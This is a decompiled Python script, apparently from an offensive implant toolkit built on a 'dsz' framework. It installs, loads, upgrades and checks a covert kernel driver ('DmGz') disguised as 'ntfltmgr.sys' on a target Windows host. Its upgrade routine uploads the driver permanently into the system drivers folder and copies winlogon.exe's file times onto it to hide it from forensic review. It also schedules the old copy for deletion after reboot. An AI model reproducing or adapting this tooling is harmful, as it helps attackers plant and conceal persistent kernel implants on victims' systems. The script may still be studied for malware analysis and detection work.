# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _DmGz.py
import dsz
import dsz.lp
import dsz.menu
import dsz.user
import datetime
import socket
import sys
import xml.dom.minidom
import dsz.windows.driver
try:
    dsz.lp.AddResDirToPath('DeMi')
    import demi
    import demi.registry
    import demi.windows.driver
    bNoDemi = False
except:
    bNoDemi = True

Action = 'action'
Method = 'method'
Quiet = 'quiet'
Silent = 'silent'
Driver = 'driver'
OldDriver = 'oldname'
Verbose = 'verbose'
Project = 'Project'
LocalName = 'LocalName'
DriverName = 'DriverName'
OldDriverName = 'OldDriverName'
ModuleId = 'ModuleId'
ModuleOrder = 'ModulerOrder'
Version = 'Version'

def main():
    cmdParams = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_DmGz.txt')
    if len(cmdParams) == 0:
        return False
    try:
        params = dict()
        params[Project] = 'DmGz'
        params[LocalName] = 'ntfltmgr.sys'
        params[Version] = GetProjectVersion(params)
        try:
            params[DriverName] = dsz.lp.GetResourceName('DmGz')
        except:
            try:
                params[DriverName] = demi.registry.DMGZ.Name
            except:
                params[DriverName] = 'ntfltmgr'

        if not bNoDemi:
            try:
                params[ModuleId] = demi.registry.DMGZ.Id
                demi.registry.DMGZ.Name = params[DriverName]
            except:
                dsz.ui.Echo('\n**** DeMi present but cannot sync DMGZ configuration ****', dsz.ERROR)

        params[ModuleOrder] = 1
        params[Verbose] = False
        params[Quiet] = False
        params[Silent] = False
        if Driver in cmdParams:
            if not (cmdParams[Driver] == ['t', 'r', 'u', 'e'] or cmdParams[Driver][0] == 'true'):
                params[DriverName] = cmdParams[Driver][0]
        if OldDriver in cmdParams:
            params[OldDriverName] = cmdParams[OldDriver][0]
        else:
            params[OldDriverName] = params[DriverName]
        if Method in cmdParams:
            params[Method] = cmdParams[Method][0]
        if Verbose in cmdParams:
            params[Verbose] = True
        if Quiet in cmdParams:
            params[Quiet] = True
        if Silent in cmdParams:
            params[Silent] = True
            dsz.control.quiet.On()
        if Action not in cmdParams:
            menuItems = list()
            menuItems.append(dict({dsz.menu.Name: 'Install tools',dsz.menu.Parameter: params,dsz.menu.Function: InstallTools}))
            menuItems.append(dict({dsz.menu.Name: 'Uninstall tools',dsz.menu.Parameter: params,dsz.menu.Function: UninstallTools}))
            menuItems.append(dict({dsz.menu.Name: 'Upgrade tools',dsz.menu.Parameter: params,dsz.menu.Function: UpgradeTools}))
            menuItems.append(dict({dsz.menu.Name: 'Load driver',dsz.menu.Parameter: params,dsz.menu.Function: LoadDriver}))
            menuItems.append(dict({dsz.menu.Name: 'Unload driver',dsz.menu.Parameter: params,dsz.menu.Function: UnloadDriver}))
            menuItems.append(dict({dsz.menu.Name: 'Verify Install',dsz.menu.Parameter: params,dsz.menu.Function: VerifyInstall}))
            menuItems.append(dict({dsz.menu.Name: 'Verify driver is running',dsz.menu.Parameter: params,dsz.menu.Function: VerifyRunning}))
            menuItems.append(dict({dsz.menu.Name: 'Check driver status',dsz.menu.Parameter: params,dsz.menu.Function: CheckDriverStatus}))
            bContinue = True
            while bContinue:
                ret, choice = dsz.menu.ExecuteSimpleMenu('%s Control' % params[Version], menuItems)
                if ret == '':
                    bContinue = False
                else:
                    dsz.ui.Pause()

            return True
        if cmdParams[Action][0].lower() == 'install':
            return InstallTools(params)
        if cmdParams[Action][0].lower() == 'uninstall':
            return UninstallTools(params)
        if cmdParams[Action][0].lower() == 'upgrade':
            return UpgradeTools(params)
        if cmdParams[Action][0].lower() == 'verifyinstall':
            return VerifyInstall(params)
        if cmdParams[Action][0].lower() == 'verifyrunning':
            return VerifyRunning(params)
        if cmdParams[Action][0].lower() == 'load':
            return LoadDriver(params)
        if cmdParams[Action][0].lower() == 'unload':
            return UnloadDriver(params)
        if cmdParams[Action][0].lower() == 'status':
            return CheckDriverStatus(params)
    except RuntimeError as err:
        dsz.ui.Echo('%s' % err, dsz.ERROR)
        return False

    return True


def InstallTools(params, ask=None):
    bAsk = ask
    if bAsk == None:
        bAsk = not params[Quiet]
    if IsKiSuEnabled(params):
        return demi.windows.driver.Install(params[Project], params[DriverName], params[LocalName], 2, 1, params[ModuleId], params[ModuleOrder], bAsk)
    else:
        return dsz.windows.driver.Install(params[Project], params[DriverName], params[LocalName], 2, 1, bAsk)
        return


def UninstallTools(params, ask=None):
    bAsk = ask
    if bAsk == None:
        bAsk = not params[Quiet]
    if IsKiSuEnabled(params):
        return demi.windows.driver.Uninstall(params[Project], params[DriverName], params[ModuleId], bAsk)
    else:
        return dsz.windows.driver.Uninstall(params[Project], params[DriverName], bAsk)
        return


def UpgradeTools(params, ask=None):
    bAsk = ask
    if bAsk == None:
        bAsk = not params[Quiet]
    if bAsk and not dsz.ui.Prompt('Do you want to upgrade the %s driver (%s.sys -> %s.sys)?' % (params[Project], params[OldDriverName], params[DriverName])):
        return False
    else:
        bRet = True
        tmpDriverName = params[DriverName]
        params[DriverName] = params[OldDriverName]
        if not UninstallTools(params, False):
            bRet = False
        params[DriverName] = tmpDriverName
        if not InstallTools(params, False):
            bRet = False
        if not LoadDriver(params):
            bRet = False
        if not bRet:
            dsz.ui.Echo('Parts of the upgrade failed')
            VerifyInstall(params)
            VerifyRunning(params)
        return bRet


def LoadDriver(params):
    if IsKiSuEnabled(params):
        return demi.windows.driver.Load(params[DriverName], params[ModuleId])
    else:
        return dsz.windows.driver.Load(params[DriverName])


def UnloadDriver(params):
    if IsKiSuEnabled(params):
        return demi.windows.driver.Unload(params[DriverName], params[ModuleId])
    else:
        return dsz.windows.driver.Unload(params[DriverName])


def VerifyInstall(params):
    if IsKiSuEnabled(params):
        return demi.windows.driver.VerifyInstall(params[DriverName], params[ModuleId], 2, 1)
    else:
        return dsz.windows.driver.VerifyInstall(params[DriverName], 2, 1)


def VerifyRunning(params):
    dsz.control.echo.Off()
    if IsKiSuEnabled(params):
        demi.windows.driver.VerifyRunning(params[DriverName], params[ModuleId])
        dsz.ui.Echo('Checking for presence of DMGZ via control plugin')
        if dsz.cmd.Run('dmgz_control -status -driver %s' % params[DriverName]):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        else:
            dsz.ui.Echo('    FAILURE', dsz.ERROR)
            return False

    else:
        return dsz.windows.driver.VerifyRunning(params[DriverName])


def CheckDriverStatus(params):
    dsz.control.echo.Off()
    bSuccess = True
    if not dsz.cmd.Run('dmgz_control -version -driver "%s"' % params[DriverName], dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('\n**** UNABLE TO GET DRIVER VERSION ****', dsz.ERROR)
        bSuccess = False
    else:
        try:
            major = dsz.cmd.data.Get('versionitem::major', dsz.TYPE_INT)[0]
            minor = dsz.cmd.data.Get('versionitem::minor', dsz.TYPE_INT)[0]
            fix = dsz.cmd.data.Get('versionitem::fix', dsz.TYPE_INT)[0]
            dsz.ui.Echo('    Driver Version : %d.%d.%d' % (major, minor, fix))
        except:
            dsz.ui.Echo('\n**** UNABLE TO GET DRIVER VERSION****', dsz.ERROR)
            bSuccess = False

    if not dsz.cmd.Run('dmgz_control -status -driver "%s"' % params[DriverName], dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('\n**** UNABLE TO GET DRIVER STATUS ****', dsz.ERROR)
        bSuccess = False
    else:
        try:
            statusitem = dsz.cmd.data.Get('statusitem', dsz.TYPE_OBJECT)
            for status in statusitem:
                try:
                    index = dsz.cmd.data.ObjectGet(status, 'index', dsz.TYPE_INT)[0]
                    mailslot = dsz.cmd.data.ObjectGet(status, 'mailslot', dsz.TYPE_STRING)[0]
                    processId = dsz.cmd.data.ObjectGet(status, 'process', dsz.TYPE_INT)[0]
                    triggerTime = dsz.cmd.data.ObjectGet(status, 'lasttriggertime::time', dsz.TYPE_STRING)[0]
                    triggerStatus = dsz.cmd.data.ObjectGet(status, 'lasttriggerstatus', dsz.TYPE_STRING)[0]
                    triggerStatusVal = dsz.cmd.data.ObjectGet(status, 'lasttriggerstatusvalue', dsz.TYPE_INT)[0]
                    if processId != 0 or index == 0:
                        dsz.ui.Echo('-----------------------------------------------------------------')
                        dsz.ui.Echo('                Index : %d' % index)
                        dsz.ui.Echo('  Registered Mailslot : %s' % mailslot)
                        dsz.ui.Echo('Registered Process Id : %s' % processId)
                        dsz.ui.Echo('    Last Trigger Time : %s' % triggerTime)
                        dsz.ui.Echo('  Last Trigger Status : %d (%s)' % (triggerStatusVal, triggerStatus))
                except:
                    pass

        except:
            dsz.ui.Echo('\n**** UNABLE TO GET DRIVER STATUS****', dsz.ERROR)
            bSuccess = False

    return bSuccess


def GetProjectVersion(params):
    try:
        resDir = dsz.lp.GetResourcesDirectory()
        xmlFile = '%s/DmGz/Version/DmGz_Version.xml' % resDir
        doc = xml.dom.minidom.parse(xmlFile)
        verNode = doc.getElementsByTagName('Version').item(0)
        verStr = ''
        for n in verNode.childNodes:
            if n.nodeType == xml.dom.Node.TEXT_NODE:
                verStr = '%s%s' % (verStr, n.data)

        return verStr
    except:
        raise
        return 'DmGz 0.0.0.0'


def IsKiSuEnabled(params):
    if Method in params:
        if params[Method].lower() == 'dsz':
            return False
        if params[Method].lower() == 'demi':
            if bNoDemi:
                dsz.ui.Echo(' DeMi is not installed on this LP', dsz.ERROR)
                sys.exit(-1)
            return True
    if bNoDemi:
        return False
    return demi.UseKiSu()


def DszUpgradeDriver(project, drvName, ask=True):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    systemRoot = dsz.path.windows.GetSystemPath()
    tmpName = '%s32.sys' % drvName
    dsz.ui.Echo('Move existing driver')
    if not dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, drvName, systemRoot, tmpName)):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
    dsz.ui.Echo('    MOVED', dsz.GOOD)
    dsz.ui.Echo('Uploading the SYS file')
    if not dsz.cmd.Run('put "%s.sys" -name "%s\\drivers\\%s.sys" -permanent -project %s' % (drvName, systemRoot, drvName, project)):
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        dsz.cmd.Run('move "%s\\drivers\\%s.sys" "%s\\drivers\\%s"' % (systemRoot, tmpName, systemRoot, drvName))
        return False
    dsz.ui.Echo('    SUCCESS', dsz.GOOD)
    if dsz.version.checks.IsOs64Bit():
        matchFile = '%s\\winlogon.exe' % systemRoot
    else:
        matchFile = '%s\\user.exe' % systemRoot
    dsz.ui.Echo('Matching file times for %s.sys with %s' % (drvName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s.sys"' % (matchFile, systemRoot, drvName)):
        dsz.ui.Echo('    MATCHED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.WARNING)
    dsz.ui.Echo('Matching file times for %s with %s' % (tmpName, matchFile))
    if dsz.cmd.Run('matchfiletimes -src "%s" -dst "%s\\drivers\\%s"' % (matchFile, systemRoot, tmpName)):
        dsz.ui.Echo('    MATCHED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.WARNING)
    dsz.ui.Echo('Deleting existing driver')
    if dsz.cmd.Run('delete -file "%s\\drivers\\%s" -afterreboot' % (systemRoot, tmpName)):
        dsz.ui.Echo('    MOVED', dsz.GOOD)
    else:
        dsz.ui.Echo('    FAILED', dsz.ERROR)
    dsz.ui.Echo('Upgrade complete (reboot required)')
    return True


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)